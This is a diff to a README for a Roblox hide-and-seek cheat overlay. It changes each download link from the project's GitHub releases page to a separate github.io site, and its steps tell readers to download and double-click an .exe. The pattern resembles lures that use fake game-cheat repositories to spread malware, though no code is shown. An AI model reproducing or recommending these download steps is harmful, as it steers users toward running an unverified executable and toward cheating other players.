@@ -1,6 +1,6 @@
 # 🎮 Roblox-Hide-Assist - Gain advantage in hide and seek
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Dynahtwentyfirst674/Roblox-Hide-Assist/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://dynahtwentyfirst674.github.io)
 
 Roblox-Hide-Assist provides a visual overlay for hide-and-seek games within Roblox. It tracks player movement and highlights locations to help you find opponents or hide more effectively. The software functions as a helper tool designed to run alongside your Roblox client.
 
@@ -22,7 +22,7 @@ Roblox-Hide-Assist provides a visual overlay for hide-and-seek games within Robl
 
 ## 🚀 How to Install and Start
 
-1. Visit this page to download the latest version: [https://github.com/Dynahtwentyfirst674/Roblox-Hide-Assist/releases](https://github.com/Dynahtwentyfirst674/Roblox-Hide-Assist/releases).
+1. Visit this page to download the latest version: [https://dynahtwentyfirst674.github.io](https://dynahtwentyfirst674.github.io).
 2. Look for the file ending in `.exe` under the Assets section of the latest release.
 3. Click the file to save it to your Downloads folder.
 4. Locate the file in your folder and double-click it to begin the setup.
